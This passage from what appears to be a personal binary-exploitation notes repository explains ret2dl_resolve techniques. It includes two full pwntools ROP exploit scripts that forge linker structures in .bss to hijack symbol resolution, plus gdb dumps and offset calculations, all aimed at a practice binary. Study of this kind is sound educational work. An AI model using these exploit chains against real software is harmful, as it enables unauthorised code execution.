2. ability to write to memory we use read() and a mov [reg],reg and corespoding pop gadgets to write our fake frame/dynstr entry.  (if we cant find a pop rdx we could ret2csu before)

```
readelf -S resolve_partial_relro
		
  [ 6] .dynsym           DYNSYM           00000000004003c8
  [ 7] .dynstr           STRTAB           0000000000400470
  [11] .rela.plt         RELA             0000000000400550
  [22] .dynamic          DYNAMIC          0000000000403e20
  [24] .got.plt          PROGBITS         0000000000404000
  [26] .bss              NOBITS           0000000000404040

```

we can create a fake .rel.plt entry in the .bss and pass a huge index to _dl_runtime_resolve(elf_info,index)

<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/_relplt.png">

we set 0x277 as index.   \
than runtime_resolve would look for the .rel.plt entry @ 404078 which is in .bss we have controll over and can place a fake .rel.plt struct here that contains the fake r_info.   

```
addr_fake_frame - addr_of_.rel.plt = byte_offset / 0x18 = index_offset 
0x404078 - 00400550 = 0x3B28/0x18 = 0x277   
```

<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/_dynsym.png">
we set our fake r_info to 0x288 and place our fake .dynsym struct that contains the fake st_name entry directly under our fake .rel.plt struct   /
		
```
(addr_fake_struct + len(fake_.rel.plt)) - addr_of_.dynsym = byte_offset / 0x18 = fake_r_info 
(0x404078+0x10) - 004003c8     				#+0x10 cause our fake_.rel.plt is 16 bytes
0x404088 - 004003c8 = 0x3cc0/0x18 = 0x288   
```	

here we set the st_name offset to 0x3c30.    \
starting @ 0x400470 to our fake string @ 0x4040a0    
```
(addr_fake_struct + len(fake_.rel.plt) + len(fake_dynsym)) - addr_of_.dynstr = st_name 
(0x404078+0x10+0x18) - 0x400470    			#+0x10 cause our fake_.rel.plt is 16 bytes +0x18 cause fake_dynsym is 24 bytes
0x4040a0 - 0x400470 = 0x3c30    
```
and as last step we set what libc function we want to resolve into our fake .dynstr entry @ 0x4040a0




This aproach will not work allways:
If the Dynamic loader checks the boundaries.
If symbol versioning and huge pages are enabled. 
		

<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/Method2.png">
		
```
#!/usr/bin/env python3
from pwn import *
import ctypes

fname = f'resolve_partial_relro'
ip = '0.0.0.0'
port = 1337

#set target binary and context
elf = context.binary = ELF(f'./{fname}')

#set libc for Pwntools
#libc = ELF('libc.so.6')



gdbscript="""
b *main
b *0x00000000004011c8
b *0x7ffff7fe7bb0
b *0x7ffff7fe00b0
b *0x7ffff7fe010b
b *0x7ffff7fe017f
"""

mode = 'attach'

if mode == 'attach':
    r = process(f'{fname}',aslr=False)

    #attach(f'{fname}',gdbscript=gdbscript)
    #set follow-fork-mode child
elif mode == 'debug':
    r = gdb.debug(f'./{fname}',aslr=False,gdbscript=gdbscript)
elif mode == 'remote':
    r = remote(ip,port)

rb = lambda x :r.recvb(x)
rl = lambda : r.recvline()
ru = lambda x :r.recvuntil(x)
s = lambda x :r.send(x)
sl = lambda x : r.sendline(x)
sla = lambda x,y : r.sendlineafter(x,y)
inter = lambda : r.interactive()

# this will import the libc rand() function that we can use it in ur python script

#libc = ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6')


def pwn():


    pop_rdi     = 0x401263
    pop_rsi_r15 = 0x401261
    pop_rdx     = 0x4011d1
    read = elf.plt['read']
    dl_resolve = 0x401020

    dynsym = 0x4003c8
    dynstr = 0x400470
    rel_plt = 0x400550



    fake_frame_addr = 0x404078
    print(f'fake frame addr = {hex(fake_frame_addr)}')
    print(f'fake r_info @ {hex(fake_frame_addr + 0xc)}')


    fake_r_info = int(((fake_frame_addr + 0x18) - dynsym) / 0x18)
    print(f'fake r_info = {hex(fake_r_info)}')
    print(f'fake st_name @ {hex(fake_r_info*0x18 + dynsym)}') #addr of fake_st_name

    #r_info is the offset from .dynsym to our fake .dynsym entry in steps of 0x18
    #0x288*0x18 = 0x3cc0    0x4003c8 + 0x3xcc0 = 0x404088


    fake_st_name = int((fake_frame_addr + 0x10 + 0x18) - dynstr)
    print(f'fake st_name = {hex(fake_st_name)}')
    print(f'fake string entry @ {hex(fake_st_name + dynstr)}')   #addr of fake_string_puts

    #st_name is the offset form .dynstr to our fake string puts
    #0x3c30 + 0x400470 = 0x4040a0




    #fake .rel.plt 0x10
    fake_frame = b''                                                                        
    fake_frame += p64(0x404018)        #0x404078 - 0x404080               #GOT addr where to resolve to                       
    fake_frame += p32(0x7)             #0x404080 - 0x404084               #needet to pass a internal check                    
    fake_frame += p32(fake_r_info)     #0x404084 - 0x404088               #fake_r_info                                             
                                                                          #r_addet we dont need these and it would destory the offsets when we add 8 bytes here
    #fake .dynsym 0x18
    fake_frame += p32(fake_st_name)    #0x404088 - 0x40408c               #st_name                                            
    fake_frame += b'\x00'              #0x40408c - 0x40408d               #st_info                           
    fake_frame += b'\x00'              #0x40408d - 0x40408e               #st_other                                           
    fake_frame += b'\x00\x00'          #0x40408e - 0x404090               #st_shndx                                           
    fake_frame += p64(0x00)            #0x404090 - 0x404098               #st_value                                           
    fake_frame += p64(0x00)            #0x404098 - 0x4040a0               #st_size

    #fake .dynstr entry
    fake_frame += b'puts\x00'          #0x4040a0                        #fake dynstr entry 




    len_fake_frame = len(fake_frame)

    dl_resolve_index = int((fake_frame_addr - rel_plt) / 24)
    print(f'fake Index = {hex(dl_resolve_index)}')

    payload = b''
    payload += b'A'*24              #pad
		
    #setup the read() to write our fake_frame
    payload += p64(pop_rdi)
    payload += p64(0x00)            #read from stdin
    payload += p64(pop_rsi_r15)
    payload += p64(fake_frame_addr)     #.bss addr
    payload += p64(0x00)            #junk r15
    payload += p64(pop_rdx)
    payload += p64(len_fake_frame)
    payload += p64(read)
    
    #setup registers for the resolved function in this case puts		
    payload += p64(pop_rdi)
    payload += p64(0x400000)            #argument for the function we resolve
	
    #setup arguments for the __dl_runtime_resolve() and call it.
    payload += p64(dl_resolve)
    payload += p64(dl_resolve_index)
    #for debugging
    payload += p64(0x1111111111111111)  #we hang here but we executed puts and '\x7fELF' sould be printed

    s(payload)
    pause(5)
    s(fake_frame)
    
    inter()


if __name__ == '__main__':
    pwn()		
```

</div>
</details>


	
	
<details>
    <summary>ret2dl_resolve method 3. (PIE is off//partial RELRO)</summary>
        <div>
in prgoress		
# ret2dl_resolve method 3. (PIE is off//partial RELRO)

Prerequisites
1. IP controll
2. ability to write to memory we use read() but you could also use a mov [reg],reg and corespoding pop gadgets to write our fake frame/dynstr entry.  (if we cant find a pop rdx we could ret2csu before)

3. ability to read a pointer `mov rdi,[rdx]`
4. ability to write to a pointer with an offset  `mov qword ptr [rdx + rsi], rdi; ret;` or something similar add or inc would work to to set the right offset than a `mov [rdx],rdi` would work too. 


elf_info points to a link_map struct    \
the link_map holds a pointer to the .dynstr table at offset 0x68 (offsets can change so allways check this)    \
the elf_info is allways available at a reserved GOT entry GOT[1] (when partial or no RELRO is active)

```
gef➤  got

GOT protection: Partial RelRO | GOT functions: 2
 
[0x404018] read@GLIBC_2.2.5  →  0x7facdbf8f130
[0x404020] setvbuf@GLIBC_2.2.5  →  0x7facdbf05e60

```

		
GOT[1] = 0x0000000000404008│+0x0008: 0x00007facdc0b4190  →  0x0000000000000000
```
gef➤  tel 0x404000
0x0000000000404000│+0x0000: 0x0000000000403e20  →  0x0000000000000001
0x0000000000404008│+0x0008: 0x00007facdc0b4190  →  0x0000000000000000
0x0000000000404010│+0x0010: 0x00007facdc09da60  →   endbr64 
0x0000000000404018│+0x0018: 0x00007facdbf8f130  →  <read+0> endbr64 
0x0000000000404020│+0x0020: 0x00007facdbf05e60  →  <setvbuf+0> endbr64 
0x0000000000404028│+0x0028: 0x0000000000000000
0x0000000000404030│+0x0030: 0x0000000000000000
0x0000000000404038│+0x0038: 0x0000000000000000
0x0000000000404040│+0x0040: 0x00007facdc06a6a0  →  0x00000000fbad2087
0x0000000000404048│+0x0048: 0x0000000000000000
```
0x00007facdc0b41f8│+0x0068: 0x0000000000403ea0  →  0x0000000000000005 we want to overwrite this with our fake_frame addr		
```
gef➤  tel 14 0x00007facdc0b4190
0x00007facdc0b4190│+0x0000: 0x0000000000000000
0x00007facdc0b4198│+0x0008: 0x00007facdc0b4730  →  0x0000000000000000
0x00007facdc0b41a0│+0x0010: 0x0000000000403e20  →  0x0000000000000001
0x00007facdc0b41a8│+0x0018: 0x00007facdc0b4740  →  0x00007fff7a6c5000  →  0x00010102464c457f
0x00007facdc0b41b0│+0x0020: 0x0000000000000000
0x00007facdc0b41b8│+0x0028: 0x00007facdc0b4190  →  0x0000000000000000
0x00007facdc0b41c0│+0x0030: 0x0000000000000000
0x00007facdc0b41c8│+0x0038: 0x00007facdc0b4718  →  0x00007facdc0b4730  →  0x0000000000000000
0x00007facdc0b41d0│+0x0040: 0x0000000000000000
0x00007facdc0b41d8│+0x0048: 0x0000000000403e20  →  0x0000000000000001
0x00007facdc0b41e0│+0x0050: 0x0000000000403f00  →  0x0000000000000002
0x00007facdc0b41e8│+0x0058: 0x0000000000403ef0  →  0x0000000000000003
0x00007facdc0b41f0│+0x0060: 0x0000000000000000
0x00007facdc0b41f8│+0x0068: 0x0000000000403ea0  →  0x0000000000000005
```
							   

<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/Method3.png">

							   
							   
```
#!/usr/bin/env python3
from pwn import *


fname = 'resolve_partial_relro'
ip = '0.0.0.0'
port = 5000 #change this
context.binary = elf = ELF('resolve_partial_relro')




LOCAL = True

if LOCAL:
    r = process(fname,aslr=True)

    gdbscript="""
    b *main
    b *0x00000000004011c8
    b *0x00000000004011bb


    """
    #set follow-fork-mode

    attach('resolve_partial_relro',gdbscript=gdbscript)
else:
    r = remote(ip, port)

s = lambda x : r.send(x)
rl = lambda : r.recvline()
rlb = lambda : r.recvlineb()
sl = lambda x : r.sendline(x)
ru = lambda x :r.recvuntil(x)
rcb = lambda x :r.recvb(x)
sla = lambda x,y : r.sendlineafter(x,y)
inter = lambda : r.interactive()


def pwn():



	GOT1 = 0x404008

	pop_rdi = 0x0000000000401273
	pop_rsi_r15 = 0x0000000000401271
	pop_rdx = 0x00000000004011d1

	
	write_with_offset = 0x00000000004011dc				#: mov qword ptr [rdx + rsi], rdi; ret;
	read_from_ptr = 0x00000000004011d8 				#: mov rdi, qword ptr [rdx]; ret; 
	mov_rdx_rdi = 0x00000000004011e1

	resolve = 0x401040						#for setbuf

	fake_frame_addr = 0x00000000004040a0   				#in .bss

	fake_frame = b''
	
	#fake link_map entry for DT_STRTAB						   
	fake_frame += p64(0x5)						#d_tag	#0x4040a0 - 0x4040a8
	fake_frame += p64(fake_frame_addr + 0x10)			#d_val	#0x4040a8 - 0x4040b0
	
	#fake .dynstr						   
	fake_frame += b'\x00'						#start of fake .dynstr 0x4040b0 -
	fake_frame += b'libc.so.6\x00'
	fake_frame += b'stdin\x00'
	fake_frame += b'read\x00'
	fake_frame += b'stdout\x00'
	fake_frame += b'puts\x00\x00\x00'				#setbuf was here before
	fake_frame += b'__libc_start_main\x00'
	fake_frame += b'GLIBC_2.2.5\x00'
	fake_frame += b'__gmon_start__\x00'

	len_fake_frame = len(fake_frame)

	payload = b''
	payload += b'A'*24		

	#write our fake_frame into .bss
	payload += p64(pop_rdi)				
	payload += p64(0x00)					#stdin
	payload += p64(pop_rsi_r15)
	payload += p64(fake_frame_addr)				#where
	payload += p64(0x00)					#junk
	payload += p64(pop_rdx)
	payload += p64(len_fake_frame)				#how many bytes
	payload += p64(elf.plt['read'])



	#get pointer from GOT[1]
	payload += p64(pop_rdx)
	payload += p64(GOT1)
	payload += p64(read_from_ptr)

	#rdi now holds the link_map pointer we need to add 0x68 for the fake DT_STRTAB entry
	
	#we will write with mov qword ptr [rdx + rsi], rdi; ret;
	#so we need to setup the registers
	payload += p64(mov_rdx_rdi)				#rdx now holds the link_map pointer
	payload += p64(pop_rsi_r15)			
	payload += p64(0x68)					#rsi holds the offset
	payload += p64(0x00)					#r15 junk
	payload += p64(pop_rdi)				
	payload += p64(fake_frame_addr)				#rdi holds the addr where we want to point the new d_val to

	#write fake_frame_pointer
	payload += p64(write_with_offset)


	#set arg for resolved puts
	payload += p64(pop_rdi)
	payload += p64(0x400000)

	#and thann call the resolver
	payload += p64(0x401040)

	#we crash here but '\x7fELF' should be printed
	payload += p64(0x111111)*4 

	s(payload)
	input('press enter to send fake_frame')
	s(fake_frame)
	inter()

if __name__ == '__main__':
    pwn()




							   
```
							   
</div>
</details>


		
	
<details>
    <summary>ret2dl_resolve method 4. (PIE is off//full RELRO)</summary>
        <div>
		
# ret2dl_resolve method 4. (PIE is off//full RELRO)
		
in this methode we use a debugging feature DT_DEBUG in the .dynamic section that points to a debugger data struct. (it is used by e.g. gdb to track loading of new librarys)

this DT_DEBUG data struct also holds a pointer to the link_map

but we still have to find the dl_runtime_resolve() cause the reserved GOT entry for it is gone as well as the elf_info link_map reserver GOT

the link_map is part of a linked list.
If we go to the next entry in the liniked list 


Prerequisites
1. IP controll
2. ability to write to an addr `*(destination) = value` 

`mov [rax],rdi`


3. ability to write to a pointer with an offset  `*(*(rax) + offset) = value`


```
mov rax, [rax]
mov [rax + offset],value
```

4. 

```
mov pointer, [pointer]
mov reg, [pointer + offset]
mov [destination], reg
```
5.
```
mov reg, [source]
mov [esp + offset], reg
```

```
     ___________________                     ___________________         ___________________ 
    |   Dynamic section |                   |       [HEAP]      |       |        GOT        |  
    |______.dynamic_____|                   |___________________|     |>|______.plt.got_____|    
    |        ...        |                   |         ...       |     | |       GOT[0]      |   
    |___________________|                   |___________________|     | |___________________|   
    |  d_tag: DT_DEBUG  |                   |      r_version    |     | |       GOT[1]      |      
    |___________________|                   |___________________|     | |___________________|      
    |       d_val       | ---------------->>|        r_map      |     | |       GOT[2]      |---_dl_runtime_resolve
    |___________________|                   |___________________|--|  | |___________________|    
    |        ...        |                   |         ...       |  |  | |       GOT[3]      | 
    |___________________|                   |___________________|  |  | |___________________|   
    |  d_tag: DT_STRTAB |           |-------|l_info [DT_STRTAB] |  |  | |        ...        |  
    |___________________|           | ......|___________________|  |  | |___________________|  
 ---|       d_val       |           | .     |         ...       |  |  |    
 |  |___________________|           | .     |___________________|  |  |   
 |                                  | .   --|       l_next      |<-|  |
 |                                  | .   | |___________________|     |
 |                                  | .   | |         ...       |     |
 |                                  | .   | |___________________|     |
 |                                  | .   |>| l_info[DT_PLTGOT] |-----|
 |                                  | .     |___________________|
 |   ___________________            | .
 ->>|    String table   |<<---------- .
    |______.dynstr______|              .
    |        ...        |               ................
    |___________________|        ___________________   .
    |       read\0      |       |    Writable area  |  .
    |___________________|       |________.bss_______|<<.
    |       puts\0      |<--    |        ...        |
    |___________________|  |    |___________________|
    |        ...        |  |    |       read\0      |
    |___________________|  |    |___________________|
                           |..>>|       execve\0    |
     ___________________   |.   |___________________| 
    |   Symbol table    |  |.  
    |______.dynsym______|  |.    
    |        ...        |  |.   
    |___________________|  |.   
    |      st_name      |--|.    
    |___________________| 
    |      st_info      |    
    |___________________|   
    |        ...        |    
    |___________________| 
```
IN PROGESS
		
		
		
</div>
</details>

# SROP
in progress
<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/sigret_frame.png">
